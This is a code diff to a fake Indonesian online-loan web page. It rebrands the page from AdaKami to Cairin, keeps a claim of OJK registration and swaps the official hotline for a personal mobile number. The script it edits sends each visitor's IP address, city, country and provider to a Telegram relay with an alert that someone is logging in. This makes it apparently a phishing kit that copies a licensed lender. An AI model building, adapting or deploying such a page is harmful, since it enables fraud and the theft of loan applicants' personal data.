@@ -9,7 +9,7 @@
     <meta http-equiv="Cache-Control" content="no-store, must-revalidate">
     <meta name="apple-mobile-web-app-capable" content="no">
     <meta http-equiv="expires" content="0">
-    <title>AdaKami</title>
+    <title>Cairin</title>
 
     <style>
         /* =========================================
@@ -126,7 +126,7 @@
             <div class="arrow-left" onclick="history.back()">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
             </div>
-            <div class="title">AdaKami</div>
+            <div class="title">Cairin</div>
             <div class="right-button"></div>
         </div>
 
@@ -248,7 +248,7 @@
                         <svg width="60" height="30" viewBox="0 0 100 40" fill="#00903B"><text x="5" y="25" font-size="20" font-weight="bold">OJK</text></svg>
                         <svg width="60" height="30" viewBox="0 0 100 40" fill="#00903B"><text x="5" y="25" font-size="20" font-weight="bold">AFPI</text></svg>
                     </div>
-                    <p class="ad-card__content">"AdaKami sudah terdaftar dan diawasi oleh OJK dengan nomor surat KEP-128/D.05/2019 Risiko kredit atau gagal bayar ditanggung sepenuhnya oleh nasabah. Tidak ada lembaga atau otoritas negara yang bertanggung jawab atas risiko gagal bayar."</p>
+                    <p class="ad-card__content">"Cairin sudah terdaftar dan diawasi oleh OJK dengan nomor surat KEP-128/D.05/2019 Risiko kredit atau gagal bayar ditanggung sepenuhnya oleh nasabah. Tidak ada lembaga atau otoritas negara yang bertanggung jawab atas risiko gagal bayar."</p>
                     <div class="company">
                         <div class="company__item">
                             <svg class="company__icon" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
@@ -260,7 +260,7 @@
                         </div>
                         <div class="company__item">
                             <svg class="company__icon" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
-                            <p class="company__name">+ TEL 1500077</p>
+                            <p class="company__name">+ 📞 083185166462</p>
                         </div>
                     </div>
                 </div>
@@ -448,7 +448,7 @@
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
-                    const infoPesan = `<b>🚀 NGA!!! NGA!!! ADE YANG NAK LOGIN!</b>\n\n<b>Link:</b> https://adakami-tan.vercel.app\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+                    const infoPesan = `<b>🚀 NGA!!! NGA!!! ADE YANG NAK LOGIN!</b>\n\n<b>Link:</b> https://Cairin-tan.vercel.app\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
 
                     fetch('/api/kirim-telegram', {
                         method: 'POST',
